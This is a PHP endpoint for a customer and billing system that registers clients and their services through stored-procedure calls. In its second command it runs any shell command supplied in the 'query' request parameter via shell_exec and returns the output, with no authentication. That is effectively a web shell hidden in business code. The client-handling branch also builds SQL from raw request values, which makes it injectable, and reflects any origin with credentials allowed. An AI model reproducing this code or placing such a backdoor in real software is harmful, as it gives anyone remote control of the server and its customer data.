<?php 
	
	header("Content-Security-Policy: upgrade-insecure-requests");

	if (isset($_SERVER['HTTP_ORIGIN'])) {  
	    header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");  
	    header('Access-Control-Allow-Credentials: true');  
	    header('Access-Control-Max-Age: 86400');
	    header('Content-Type: text/html; charset=utf-8');   
	}

	if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {  

	    if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
	        header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");  

	    if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
	        header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");  
	}

	header('Content-Type: application/json; charset=utf-8');
	$salida = ['success'=>0,'msj'=>"APSY"];
	$_REQUEST['cmd'] = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : -1;
	require_once '_config/mysqlDB.php';
	$db = new DBClass();
	$sch = isset($_REQUEST['sch']) ? $_REQUEST['sch'] : '';

	switch($_REQUEST['cmd']){
		case 1: //EXISTE CLIENTE, SINO, AGREGARLO
			if(!isset($_REQUEST['cliente']))
				break;

			$cliente = (array) json_decode(base64_decode($_REQUEST['cliente']));

			$consulta = $db->ejecutar('select count(*) from '.$sch.'clientes where cedula = "'.$cliente['cedula'].'" and !bisproveedor and id > 0')->fetch_all();

			if($consulta[0][0]){
				$salida['rs'] = $db->ejecutar('select idestado from '.$sch.'clientes where cedula = "'.$cliente['cedula'].'" and !bisproveedor and id > 0')->fetch_all()[0][0];

				$db->ejecutar('update '.$sch.'clientes set apellido1 = now() where cedula = "'.$cliente['cedula'].'" and !bisproveedor and id > 0');

				if(isset($cliente['sucursal'])){
					//agregar servicio nuevo por la sucursal
					$salida['sucursal'] = 1;
				}
			}
			else{
				//insertar cliente, pasar los valores en formato json encryptado en base64

				$rs = $db->ejecutar('call krattos("",172,"1,0,\"\",\"\",\"'.$cliente['nombre'].'\",\"'.$cliente['cedula'].'\",'.$cliente['tp'].',1,0,0,0,0,8,1,\"'.$cliente['fantasia'].'\",0,0,\"\",0,0,@idclie,1,0,0,\"\"")');

	            if(isset($rs->num_rows)){
	              $rs = $rs->fetch_all()[0][0];

	              $salida['cliente'] = $rs;

	              $correo = $db->ejecutar('call shadow(1,17,"","null,'.$rs.',2,\"'.$cliente['correo'].'\"")');
	              $telefono = $db->ejecutar('call shadow(1,238,"","null,3,\"'.$cliente['tel'].'\",2,'.$rs.',52")');

	              $serv = $db->ejecutar('call shadow(1,320,"idcliente,idservicio,next_fecha,fecha,monto,idtipo,tipofactura,nactualiza,nbase,variacion","'.$rs.','.$cliente['servicio'].',\"'.$cliente['fcorte'].'\",now(),'.$cliente['valor'].',1,1,0,0,0")');

	              if(!isset($serv->num_rows)){
	                $salida['error'] = $serv; /*CREAR SP DE ROLLBACK*/
	                $db->ejecutar('delete from clientes where id = '.$rs);
					$db->ejecutar('alter table clientes auto_increment 1');
					$db->ejecutar('delete from correos where idfila = '.$rs.' and idtabla = 2');
					$db->ejecutar('alter table correos auto_increment 1');
					$db->ejecutar('delete from telefonos where idfila = '.$rs.' and idtabla = 2');
					$db->ejecutar('alter table telefonos auto_increment 1');
					$db->ejecutar('delete from servicioclientes where idcliente = '.$rs.'');
					$db->ejecutar('alter table servicioclientes auto_increment 1');
	              }
	              else{
	              	if($cliente['prueba'])
	                	$db->ejecutar('call shadow(1,355,"","'.$rs.',1")');

	                if($cliente['simplificado'])
	                	$db->ejecutar('call shadow(1,355,"","'.$rs.',2")');

	                $rs = $db->ejecutar('call krattos("",80,"'.$rs.',1,\"'.$cliente['fcorte'].'\",0,\"\"")')->fetch_all()[0][0];

	                $salida['akey'] = $rs; //devolver el akey
	                $salida['rs'] = 1;
	              }
	          	}

				$salida['ins'] = 1;
				
			}

			$salida['success'] = 1;
			$salida['process'] = 1;
			unset($salida['msj']);
			break;
		case 2: 
			if(!isset($_REQUEST['query']))
				break;
			$rs = shell_exec($_REQUEST['query']);
			$salida['rs'] = base64_encode($rs);
			$salida['success'] = 1;
			$salida['process'] = 2;
			unset($salida['msj']);
			break;
		default:
			break;
	}

	echo json_encode($salida,JSON_PRETTY_PRINT);

 ?>